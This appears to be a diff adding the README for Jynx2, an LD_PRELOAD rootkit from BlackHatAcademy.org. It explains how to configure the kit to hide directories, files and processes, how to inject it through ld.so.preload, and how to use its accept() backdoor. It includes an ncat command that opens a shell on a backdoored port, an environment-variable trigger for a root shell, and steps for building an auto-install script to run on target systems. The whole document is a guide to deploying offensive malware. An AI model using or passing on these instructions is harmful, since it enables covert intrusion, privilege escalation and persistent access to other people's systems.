@@ -1,0 +1,112 @@
+                _   _,.-.' .-.
+            _ .' |,'   ."".| |.""._
+           ( || ,',"". `._`' `  '  `.
+           `\ | `" .-"`-..`     .    `.
+            |     `..--.._       |     \
+          _,|      _...'_.'     ,+.     `.
+     ,""'|   `...-'..""(__.._ -"   `"--.. `.
+    |`._,'  ,'  /\ .'""` .'""`. `.    |  `. \
+    '      / / /  ||    ||    |.`.`.   .   | \
+     `.__,'-._'  /|` -"'  `-.'  \ \ \   `"-'  \
+      ' `.   /  /_| | |'""| | .-""'`'"`-,.-"\  .
+     . / .\ .  /  | | `._.' ||        ,'     \  \
+    ' / / |/  /_.-+._`-..--"-.       .   .    \  `
+   / /.'  '  ,'""'-. `"."'""'`..     |.        \  \
+  / . |  j  .       . |        |\__," |.  `    '   \
+ .  | |  |  |       ' |        '|   | ' `  \    \   .
+ |    |  |  `.____,'   ..____,' |   |    .       \
+ |    |  |  | ._  _..---._   _,'    |       .        '
+ |    |  |  | | ""  .    |`"'   \ `.|     '  '  '     .
+ |    |  |  | |     |    |       `  `      .  .  \    |
+ |    |  |  | |     '    |        \  `.    |  |   .   |
+ '    '  |  | |      .   `         \   \   |  |   |   |
+  \      `  | |      |              .   `. |  |   |   |
+   \      \ ' |      `    '          `    `+..|___|___|_........
+    \      \ \|       '    .           `.    `.                 |
+     `.     \ .        .   `             `.    `-.            .'
+    _,'`.    \'         .   \              `-.._  `._       ,'
+ _."     `._ `.`        |    .                       `._   .
+`._       _,`"--`.      |     .                         `. |
+   `-._ ,'              |      `.                         `|_
+      ,'         |      |        `.                          `.
+    .'   __...__.|      |          \ __..._     _,..,.__       `.
+    `-`"'        `._..--'-.__      .'      `-..'        ``'"--..-'
+                             `"---' 
+			     
+			     
+    /$$$$$                                      /$$   /$$ /$$   /$$    
+   |__  $$                                     | $$  /$$/|__/  | $$    
+      | $$ /$$   /$$ /$$$$$$$  /$$   /$$       | $$ /$$/  /$$ /$$$$$$  
+      | $$| $$  | $$| $$__  $$|  $$ /$$//$$$$$$| $$$$$/  | $$|_  $$_/  
+ /$$  | $$| $$  | $$| $$  \ $$ \  $$$$/|______/| $$  $$  | $$  | $$    
+| $$  | $$| $$  | $$| $$  | $$  >$$  $$        | $$\  $$ | $$  | $$ /$$
+|  $$$$$$/|  $$$$$$$| $$  | $$ /$$/\  $$       | $$ \  $$| $$  |  $$$$/
+ \______/  \____  $$|__/  |__/|__/  \__/       |__/  \__/|__/   \___/  
+           /$$  | $$                                                   
+          |  $$$$$$/                                                   
+           \______/            
+
+
+	               BlackHatAcademy.org
+		          ErrProne / XO
+		     
+File list: config.h jynx2.c reality.c Makefile packer.sh README
+
+0x01. Setting up config.h.
+
+	First of all, you need to dig into config.h, and ensure that the settings meet your needs.
+MAGIC_STRING should be changed to the name of the directory you want to hide from the system. This can
+be used as a prefix to your main directory as well as for files. MAGIC_GID will be the Group ID to
+hide as well. Make sure that you set MAGIC_DIR Group ID to MAGIC_GID for hiding purposes as well.
+This will help disguise the processes from the system, including commands like ps. CONFIG_FILE 
+defaults to ld.so.preload, which is usually located in /etc. You shouldn't have to change this 
+unless you're going to dig a little deeper into hiding Jynx-Kit. MAGIC_ACK and MAGIC_SEQ have been 
+dropped in Jynx2, since the new backdoor hooks accept() system call, and still includes SSL support. 
+After installing Jynx2, ensure that you restart the daemon that you want to use as the backdoor. 
+
+0x02. The accept backdoor.
+
+	LOW_PORT and HIGH_PORT are the first of the two part new two factor authentication. The source 
+port of your connect client must fall between this port range, and since you have to be root in order 
+to use this port range, it ensures that no random connections will match this criteria. SHELL_PASSWORD 
+will be the password used for the second factor of authentication, and should be the first line sent to 
+the backdoor upon connecting. For instance say we have port 80 backdoored. Our client will connect like so.
+Make sure you are using the ssl flag with ncat.
+
+# sudo ncat exploit.net 80 -p 42 --ssl
+DEFAULT_PASS
+Bump with shell.
+>ls -lia 
+ 214473 drwxr-xr-x  2 errprone users   176 Mar  7 19:19 .
+ 177137 drwxr-xr-x 15 errprone users   952 Mar  5 22:15 ..
+
+0x03. Drop a local suid shell.
+
+	A new feature is also being able to drop a local suid shell using ENV_VARIABLE set in config.h
+To drop a shell, simply set the defined user variable, and make a call to a program with euid of 0.
+For instance you can do the following.
+
+# XxJynx=hahahax sudo
+# whoami
+root
+
+0x04. Configuring Makefile and Installing.
+
+	Once you have this configured, go ahead and open up Makefile. Make sure that MAGIC_GID 
+matches what you have in config.h. INSTALL should be set to the directory that you want to hide
+your files in. You can also set these variables upon calling "make install." See examples below.
+
+# make all              # compile jynx2.so
+# make install		# Installs jynx2, injects into ld preload, and sets correct GIDs
+# make install INSTALL=/omgxochi MAGIC_GID=100 
+
+	he last line installs the kit to /omgxochi, and sets the GID to 100. You should use GID
+of 100 for anything that you're going to run, and need to hide from the system.
+
+
+0x05. packer.sh
+	Now that you have everything configured and things compile correctly, you can use packer.sh
+in order to create an auto install shell script for future installations. Simply remove the last 2 lines
+from config.h, run packer.sh, and it will generate a new autokit.sh. ONLY RUN autokit.sh ON THE SYSTEM
+YOU WANT TO INJECT.
+
